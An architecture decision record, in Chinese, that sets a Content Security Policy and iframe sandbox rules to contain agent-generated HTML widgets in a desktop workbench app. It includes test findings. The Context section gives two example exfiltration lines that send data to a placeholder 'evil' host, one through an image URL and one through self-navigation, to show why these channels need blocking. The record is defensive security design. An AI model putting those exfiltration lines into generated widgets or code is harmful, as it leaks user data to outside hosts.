# ADR 0021：Workbench 应用 CSP 与 widget 子文档策略强制

- **Status:** Accepted
- **Date:** 2026-08-16
- **Scope:** Agent Workbench 宿主文档（`index.html` / Electron / vite dev）与 Board Widget 的 `srcdoc` 子文档
- **Map:** [#111](https://github.com/xiaowen-0725/uilab-admin/issues/111) · **Design:** [#125](https://github.com/xiaowen-0725/uilab-admin/issues/125) · **Implement:** [#134](https://github.com/xiaowen-0725/uilab-admin/issues/134)
- **Spec:** [workbench-board-spec §3](../plans/workbench-board-spec.md)

## Context

Board Widget 是 agent 生成的 HTML，跑在 `srcdoc` iframe 里。调研（#112）查明一条路线级事实：**`srcdoc` 子文档强制克隆宿主的整个 policy container（含 CSP list）**，而本仓宿主 `index.html` / `desktop/electron/main.ts` / `vite.config.ts` **当前完全没有 CSP**。

这把「应用 CSP」从安全加固升级为 **Board 能否工作的前提**：今天 widget 能跑是偶然状态，任何人日后给宿主加一条 CSP 就会让全部看板静默黑屏。

两条反直觉的实测事实决定了方案形状：

1. **继承策略里的 `'self'` 解析到宿主源**。所以宿主若写 `connect-src 'self'`，反而**允许** widget 直接打我们的本机侧车。
2. **`img-src` 与自导航都不受 `connect-src` 管**。`new Image().src='https://evil/?d='+data` 走 `img-src`；`location='https://evil/?d=...'` 是子框架跳自己，只能由**宿主**的 `frame-src` 表达（`frame-src` 管父文档嵌入子框架，不管子框架跳自己；`sandbox` 缺 `allow-top-navigation` 只挡顶层跳转）。

## Decision

采纳「**nonce + 外传通道全套收紧**」。

### 1. 宿主 CSP 落在 `index.html` meta，单一来源

```
default-src 'self'; script-src 'self' 'nonce-<PER_LOAD>'; style-src 'self' 'unsafe-inline';
img-src 'self' data: blob:; font-src 'self' data:;
connect-src 'self' http://127.0.0.1:<SIDECAR_PORT> <ws://localhost:5174 仅 dev>;
frame-src 'self'; object-src 'none'; base-uri 'none'; form-action 'none';
```

Electron 走 `loadURL(DEV_URL)` 加载同一份文档，故 meta 同时覆盖 dev / preview / 打包 / 桌面四种形态——**不需要** Electron `onHeadersReceived`，**不需要** vite `server.headers`。#125 票面担心的「三处不一致」不成立。**不得出现 `'unsafe-eval'`。**

### 2. widget iframe 用 `sandbox` + `csp=` 成对加严

```
sandbox="allow-scripts"
csp="default-src 'none'; script-src 'nonce-<SAME>'; style-src 'unsafe-inline';
     img-src data: blob:; font-src data:; connect-src 'none'; frame-src 'none';
     form-action 'none'; base-uri 'none'; object-src 'none'"
```

**绝不加 `allow-same-origin`**（实测该组合下子文档可读宿主 DOM、可写宿主 localStorage、并能删掉自己的 `sandbox` 属性）。`allow-forms` / `allow-downloads` / `allow-popups` / `allow-modals` 一律不给。widget 侧 `'self'` 解析为不透明源，等于什么都不给——这正是我们要的。

### 3. 宿主拼 srcdoc 时给 widget 的 `<script>` 盖上当次 nonce

改写**必须在渲染层做**，不能在侧车做：nonce 是宿主当次的值，侧车不持有它。

### 4. 门禁锁死回归（`check:workbench`）

含 CSP meta 存在性、`sandbox`/`csp` 成对存在、**宿主授予集必须覆盖 widget `csp=` 所需**（子文档只能加严）、禁止 board module 复用 `sandboxForTrust()`。

## Considered options

- **宿主不加 CSP**（现状）：出局。它换不到简单，只换到一个我们已宣称封住、实际没封住的外传漏洞（`img-src` + 自导航），并且把「日后有人加 CSP 就全盘黑屏」这颗雷留在原地。
- **宿主整体放宽 `'unsafe-inline' 'unsafe-eval'`**：让 widget 的内联脚本能跑，代价是宿主自己也失去 XSS 防线，且 `'unsafe-eval'` 与我们对 widget 的 `eval` 禁令自相矛盾。
- **per-render nonce**（采纳）：在本仓几乎免费——宿主是 React + Vite，全部脚本都是打包出的独立文件，**宿主自身零内联脚本**。nonce 不为宿主服务，纯粹是给 widget 开的那道门。代价只有「widget 生成侧不得用内联事件处理器」，而这本就是该守的写法，且违反会在创建时**显式失败**（`board_widget_finish` 静态检测）而非静默劣化。
- **只加 `csp=` 不加宿主 CSP**：不成立。自导航只能由宿主的 `frame-src` 表达。

## Consequences

- **widget 不能加载任何远程资源**：远程图片、字体、CDN 图表库全部不可用。需要配图时由取数作业下载后内联成 `data:` 放进产物。这条会传导到生成侧 prompt（spec §6.4）与产物体积预算。
- widget 生成规范必须禁止内联事件处理器、`eval` / `new Function` / 动态 `import()`；校验器做静态检测。
- 首版接受一处**已知弱化**：静态打包下 nonce 退化为构建期常量。本机桌面应用，宿主侧无渲染不可信 HTML 的路径。
- 后人收紧宿主 CSP 会让全部看板静默黑屏，这是本特性最主要的回归风险，靠门禁第 3 条（成对检查）挡住。

## 实测（#134 · Chromium / Vitest browser · 2026-08-16）

条件：宿主 meta CSP 为 ADR §1（`frame-src 'self'`，`script-src 'self' 'nonce-…'`）；Playwright Chromium，与 `pnpm --filter @uilab/agent-workbench test` 同一份浏览器。

| 问题 | 判定 | 证据 |
| --- | --- | --- |
| `frame-src 'self'` 是否允许 `about:srcdoc` **初始加载** | **允许**。带 nonce 的 srcdoc 脚本能跑，`location.href === 'about:srcdoc'`。 | `BoardWidgetFrame`：`board-widget-ready` |
| `frame-src 'self'` 是否拦住 srcdoc **自导航**（`location = 'https://example.com'`） | **拦住**。只给 `sandbox="allow-scripts"`、**不加** iframe `csp=` 时，导航后仍停在 `about:srcdoc`，到不了 `example.com`。自导航封堵成立，**不必另找手段**。 | `BoardWidgetFrame`：host-only 探针 |
| iframe `csp=` 对本条文指令集是否生效 | **对隔离项生效**。宿主 `connect-src` / `img-src` 允许 `http://127.0.0.1:3141`，widget `csp=` 仍拦住对该源的 `fetch` 与 `Image`；`eval` 也被拦。`font-src` / `form-action` / `base-uri` / `object-src` 未逐条探针。 | `BoardWidgetFrame`：`board-widget-csp-probe` |
| prod 期 `style-src` 能否收紧到 `'self'` | **仍待测**。宿主与 widget 目前都依赖 `'unsafe-inline'` 样式；本票未改这条。 | — |

实现备注：dev / 测试的 `connect-src` 在 ADR 的 `ws://localhost:5174` 之外，由 `transformIndexHtml` 补上实际 Vite/Vitest 端口与 `ws://127.0.0.1:*`，否则 HMR 与浏览器测试会自己违规。未加 `server.headers` / Electron `onHeadersReceived`。
